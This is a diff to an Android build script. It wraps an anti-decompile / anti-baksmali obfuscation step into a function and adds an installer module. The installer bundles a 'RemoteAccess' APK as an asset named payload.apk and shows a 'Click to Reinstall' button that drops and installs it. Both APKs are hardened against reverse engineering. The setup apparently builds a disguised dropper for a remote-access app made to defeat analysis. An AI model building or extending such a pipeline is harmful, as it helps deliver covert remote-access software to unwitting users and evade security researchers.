@@ -215,6 +215,13 @@ else
     echo "  WARNING: Release APK not found — check build output above"
 fi
 
+# ── Reusable hardening function ──────────────────────────────────────────────
+# Usage: harden_apk <path/to.apk>
+# Applies the full anti-decompile/anti-baksmali pipeline to an APK file.
+harden_apk() {
+    RELEASE_APK="$1"
+    [ -f "$RELEASE_APK" ] || { echo "  Skipping hardening — $RELEASE_APK missing."; return; }
+
 # ── 11. Anti-decompile / anti-baksmali hardening (release APK only) ──────────
 # Goal: make `apktool d` / `baksmali` / common APK reversers fail or produce
 # garbage, while the APK still installs and runs cleanly on Android.
@@ -232,8 +239,7 @@ fi
 #   d) Strip debug/source attributes   — already done by R8 full mode, double-
 #                                          checked here.
 echo ""
-echo "==> Applying anti-decompile / anti-baksmali hardening..."
-RELEASE_APK="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
+echo "==> Applying anti-decompile / anti-baksmali hardening to: $RELEASE_APK"
 if [ -f "$RELEASE_APK" ]; then
     BUILD_TOOLS_DIR="$ANDROID_SDK_DIR/build-tools/35.0.0"
     ZIPALIGN="$BUILD_TOOLS_DIR/zipalign"
@@ -520,6 +526,43 @@ PYEOF
     echo "    zipalign -p 4 (page-aligned native libs)"
 else
     echo "  Skipping hardening — release APK not produced."
+fi
+}   # ── end harden_apk() ─────────────────────────────────────────────────────
+
+# Harden the main RemoteAccess release APK
+harden_apk "$ROOT_DIR/apk-output/RemoteAccess-release.apk"
+
+# ── 12. Installer module ─────────────────────────────────────────────────────
+# Bundles the hardened RemoteAccess-release.apk as an asset. When launched
+# the installer shows a "Click to Reinstall" button that drops the bundled
+# APK and triggers the system package installer (same flow as Play Store
+# sideload). Installer goes through the SAME hardening pipeline.
+echo ""
+echo "==> Building INSTALLER module ..."
+PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
+PAYLOAD_DST="$ROOT_DIR/installer/src/main/assets/payload.apk"
+if [ -f "$PAYLOAD_SRC" ]; then
+    mkdir -p "$(dirname "$PAYLOAD_DST")"
+    cp "$PAYLOAD_SRC" "$PAYLOAD_DST"
+    PAYLOAD_SIZE=$(ls -lh "$PAYLOAD_DST" | awk '{print $5}')
+    echo "  Bundled payload: installer/src/main/assets/payload.apk ($PAYLOAD_SIZE)"
+
+    cd "$ROOT_DIR"
+    ./gradlew :installer:assembleRelease --no-daemon --stacktrace 2>&1
+
+    INSTALLER_SRC="$ROOT_DIR/installer/build/outputs/apk/release/installer-release.apk"
+    if [ ! -f "$INSTALLER_SRC" ]; then
+        INSTALLER_SRC=$(find "$ROOT_DIR/installer/build/outputs/apk/release" -name "*.apk" 2>/dev/null | head -1)
+    fi
+    if [ -n "$INSTALLER_SRC" ] && [ -f "$INSTALLER_SRC" ]; then
+        cp "$INSTALLER_SRC" "$ROOT_DIR/apk-output/Installer-release.apk"
+        echo "  Installer APK: apk-output/Installer-release.apk"
+        harden_apk "$ROOT_DIR/apk-output/Installer-release.apk"
+    else
+        echo "  WARNING: installer release APK not produced."
+    fi
+else
+    echo "  Skipping installer — main release APK missing."
 fi
 
 # ── Summary ────────────────────────────────────────────────────────────────────
